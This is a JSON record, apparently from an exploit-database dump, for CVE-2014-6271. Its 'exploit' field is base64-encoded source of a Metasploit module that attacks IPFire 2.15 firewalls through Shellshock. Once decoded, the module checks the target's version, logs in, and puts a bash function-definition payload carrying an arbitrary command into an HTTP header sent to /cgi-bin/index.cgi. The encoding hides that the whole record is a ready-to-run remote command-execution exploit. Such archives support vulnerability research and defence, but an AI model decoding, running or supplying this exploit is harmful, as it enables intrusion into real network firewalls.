{
    "source": "exploit-database", 
    "exploit": "IyMNCiMjIFRoaXMgbW9kdWxlIHJlcXVpcmVzIE1ldGFzcGxvaXQ6IGh0dHA6Ly9tZXRhc3Bsb2l0LmNvbS9kb3dubG9hZA0KIyMgQ3VycmVudCBzb3VyY2U6IGh0dHBzOi8vZ2l0aHViLmNvbS9yYXBpZDcvbWV0YXNwbG9pdC1mcmFtZXdvcmsNCiMjIw0KDQpyZXF1aXJlICdtc2YvY29yZScNCg0KY2xhc3MgTWV0YXNwbG9pdE1vZHVsZSA8IE1zZjo6RXhwbG9pdDo6UmVtb3RlDQogIGluY2x1ZGUgTXNmOjpFeHBsb2l0OjpSZW1vdGU6Okh0dHBDbGllbnQNCg0KICBkZWYgaW5pdGlhbGl6ZShpbmZvID0ge30pDQogICAgc3VwZXIoDQogICAgICB1cGRhdGVfaW5mbygNCiAgICAgICAgaW5mbywNCiAgICAgICAgJ05hbWUnICAgICAgICAgID0+ICdJUEZpcmUgQmFzaCBFbnZpcm9ubWVudCBWYXJpYWJsZSBJbmplY3Rpb24gKFNoZWxsc2hvY2spJywNCiAgICAgICAgJ0Rlc2NyaXB0aW9uJyAgID0+ICVxKA0KICAgICAgICAgIElQRmlyZSwgYSBmcmVlIGxpbnV4IGJhc2VkIG9wZW4gc291cmNlIGZpcmV3YWxsIGRpc3RyaWJ1dGlvbiwNCiAgICAgICAgICB2ZXJzaW9uIDw9IDIuMTUgVXBkYXRlIENvcmUgODIgY29udGFpbnMgYW4gYXV0aGVudGljYXRlZCByZW1vdGUNCiAgICAgICAgICBjb21tYW5kIGV4ZWN1dGlvbiB2dWxuZXJhYmlsaXR5IHZpYSBzaGVsbHNob2NrIGluIHRoZSByZXF1ZXN0IGhlYWRlcnMuDQogICAgICAgICksDQogICAgICAgICdBdXRob3InICAgICAgICAgPT4NCiAgICAgICAgICBbDQogICAgICAgICAgICAnaDAwZGllIDxtaWtlQHN0Y3lyc2VjdXJpdHkuY29tPicsICMgbW9kdWxlDQogICAgICAgICAgICAnQ2xhdWRpbyBWaXZpYW5pJyAgICAgICAgICAgICAgICAgICMgZGlzY292ZXJ5DQogICAgICAgICAgXSwNCiAgICAgICAgJ1JlZmVyZW5jZXMnICAgICA9Pg0KICAgICAgICAgIFsNCiAgICAgICAgICAgIFsgJ0VEQicsICczNDgzOScgXSwNCiAgICAgICAgICAgIFsgJ0NWRScsICcyMDE0LTYyNzEnXQ0KICAgICAgICAgIF0sDQogICAgICAgICdMaWNlbnNlJyAgICAgICAgPT4gTVNGX0xJQ0VOU0UsDQogICAgICAgICdQbGF0Zm9ybScgICAgICAgPT4gJXcoIGxpbnV4IHVuaXggKSwNCiAgICAgICAgJ1ByaXZpbGVnZWQnICAgICA9PiBmYWxzZSwNCiAgICAgICAgJ0RlZmF1bHRPcHRpb25zJyA9Pg0KICAgICAgICAgIHsNCiAgICAgICAgICAgICdTU0wnID0+IHRydWUsDQogICAgICAgICAgICAnUEFZTE9BRCcgPT4gJ2NtZC91bml4L2dlbmVyaWMnDQogICAgICAgICAgfSwNCiAgICAgICAgJ0FyY2gnICAgICAgICAgICA9PiBBUkNIX0NNRCwNCiAgICAgICAgJ1BheWxvYWQnICAgICAgICA9Pg0KICAgICAgICAgIHsNCiAgICAgICAgICAgICdDb21wYXQnID0+DQogICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAnUGF5bG9hZFR5cGUnID0+ICdjbWQnLA0KICAgICAgICAgICAgICAgICdSZXF1aXJlZENtZCcgPT4gJ2dlbmVyaWMnDQogICAgICAgICAgICAgIH0NCiAgICAgICAgICB9LA0KICAgICAgICAnVGFyZ2V0cycgICAgICAgID0+DQogICAgICAgICAgWw0KICAgICAgICAgICAgWyAnQXV0b21hdGljIFRhcmdldCcsIHt9XQ0KICAgICAgICAgIF0sDQogICAgICAgICdEZWZhdWx0VGFyZ2V0JyAgPT4gMCwNCiAgICAgICAgJ0Rpc2Nsb3N1cmVEYXRlJyA9PiAnU2VwIDI5IDIwMTQnDQogICAgICApDQogICAgKQ0KDQogICAgcmVnaXN0ZXJfb3B0aW9ucygNCiAgICAgIFsNCiAgICAgICAgT3B0U3RyaW5nLm5ldygnVVNFUk5BTUUnLCBbIHRydWUsICdVc2VyIHRvIGxvZ2luIHdpdGgnLCAnYWRtaW4nXSksDQogICAgICAgIE9wdFN0cmluZy5uZXcoJ1BBU1NXT1JEJywgWyBmYWxzZSwgJ1Bhc3N3b3JkIHRvIGxvZ2luIHdpdGgnLCAnJ10pLA0KICAgICAgICBPcHQ6OlJQT1JUKDQ0NCkNCiAgICAgIF0sIHNlbGYuY2xhc3MNCiAgICApDQogIGVuZA0KDQogIGRlZiBjaGVjaw0KICAgIGJlZ2luDQogICAgICByZXMgPSBzZW5kX3JlcXVlc3RfY2dpKA0KICAgICAgICAndXJpJyAgICAgICA9PiAnL2NnaS1iaW4vaW5kZXguY2dpJywNCiAgICAgICAgJ21ldGhvZCcgICAgPT4gJ0dFVCcNCiAgICAgICkNCiAgICAgIGZhaWxfd2l0aChGYWlsdXJlOjpVbmV4cGVjdGVkUmVwbHksICIje3BlZXJ9IC0gQ291bGQgbm90IGNvbm5lY3QgdG8gd2ViIHNlcnZpY2UgLSBubyByZXNwb25zZSIpIGlmIHJlcy5uaWw/DQogICAgICBmYWlsX3dpdGgoRmFpbHVyZTo6VW5leHBlY3RlZFJlcGx5LCAiI3twZWVyfSAtIEludmFsaWQgY3JlZGVudGlhbHMgKHJlc3BvbnNlIGNvZGU6ICN7cmVzLmNvZGV9KSIpIGlmIHJlcy5jb2RlID09IDQwMQ0KICAgICAgL1w8c3Ryb25nXD5JUEZpcmUgKD88dmVyc2lvbj5bXGQuXXs0fSkgXChbXHddK1wpIC0gQ29yZSBVcGRhdGUgKD88dXBkYXRlPltcZF0rKS8gPX4gcmVzLmJvZHkNCg0KICAgICAgaWYgdmVyc2lvbiAmJiB1cGRhdGUgJiYgdmVyc2lvbiA9PSAiMi4xNSIgJiYgdXBkYXRlLnRvX2kgPCA4Mw0KICAgICAgICBFeHBsb2l0OjpDaGVja0NvZGU6OkFwcGVhcnMNCiAgICAgIGVsc2UNCiAgICAgICAgRXhwbG9pdDo6Q2hlY2tDb2RlOjpTYWZlDQogICAgICBlbmQNCiAgICByZXNjdWUgOjpSZXg6OkNvbm5lY3Rpb25FcnJvcg0KICAgICAgZmFpbF93aXRoKEZhaWx1cmU6OlVucmVhY2hhYmxlLCAiI3twZWVyfSAtIENvdWxkIG5vdCBjb25uZWN0IHRvIHRoZSB3ZWIgc2VydmljZSIpDQogICAgZW5kDQogIGVuZA0KDQogICMNCiAgIyBDVkUtMjAxNC02MjcxDQogICMNCiAgZGVmIGN2ZV8yMDE0XzYyNzEoY21kKQ0KICAgICV7KCkgeyA6O307IC9iaW4vYmFzaCAtYyAiI3tjbWR9IiB9DQogIGVuZA0KDQogIGRlZiBleHBsb2l0DQogICAgYmVnaW4NCiAgICAgIHBheWxvYWQgPSBjdmVfMjAxNF82MjcxKGRhdGFzdG9yZVsnQ01EJ10pDQogICAgICB2cHJpbnRfc3RhdHVzKCJFeHBsb2l0aW5nIHdpdGggcGF5bG9hZDogI3twYXlsb2FkfSIpDQogICAgICByZXMgPSBzZW5kX3JlcXVlc3RfY2dpKA0KICAgICAgICAndXJpJyAgICAgICA9PiAnL2NnaS1iaW4vaW5kZXguY2dpJywNCiAgICAgICAgJ21ldGhvZCcgICAgPT4gJ0dFVCcsDQogICAgICAgICdoZWFkZXJzJyAgID0+IHsgJ1ZVTE4nID0+IHBheWxvYWQgfQ0KICAgICAgKQ0KDQogICAgICBmYWlsX3dpdGgoRmFpbHVyZTo6VW5leHBlY3RlZFJlcGx5LCAiI3twZWVyfSAtIENvdWxkIG5vdCBjb25uZWN0IHRvIHdlYiBzZXJ2aWNlIC0gbm8gcmVzcG9uc2UiKSBpZiByZXMubmlsPw0KICAgICAgZmFpbF93aXRoKEZhaWx1cmU6OlVuZXhwZWN0ZWRSZXBseSwgIiN7cGVlcn0gLSBJbnZhbGlkIGNyZWRlbnRpYWxzIChyZXNwb25zZSBjb2RlOiAje3Jlcy5jb2RlfSkiKSBpZiByZXMuY29kZSA9PSA0MDENCiAgICAgIC88bGk+RGV2aWNlOiBcL2RldlwvKD88b3V0cHV0Pi4rKSByZXBvcnRzL20gPX4gcmVzLmJvZHkNCiAgICAgIHByaW50X2dvb2Qob3V0cHV0KSB1bmxlc3Mgb3V0cHV0Lm5pbD8NCg0KICAgIHJlc2N1ZSA6OlJleDo6Q29ubmVjdGlvbkVycm9yDQogICAgICBmYWlsX3dpdGgoRmFpbHVyZTo6VW5yZWFjaGFibGUsICIje3BlZXJ9IC0gQ291bGQgbm90IGNvbm5lY3QgdG8gdGhlIHdlYiBzZXJ2aWNlIikNCiAgICBlbmQNCiAgZW5kDQplbmQ=", 
    "filename": "platforms/cgi/remote/39918.rb", 
    "id": "39918", 
    "cves": [
        "CVE-2014-6271"
    ]
}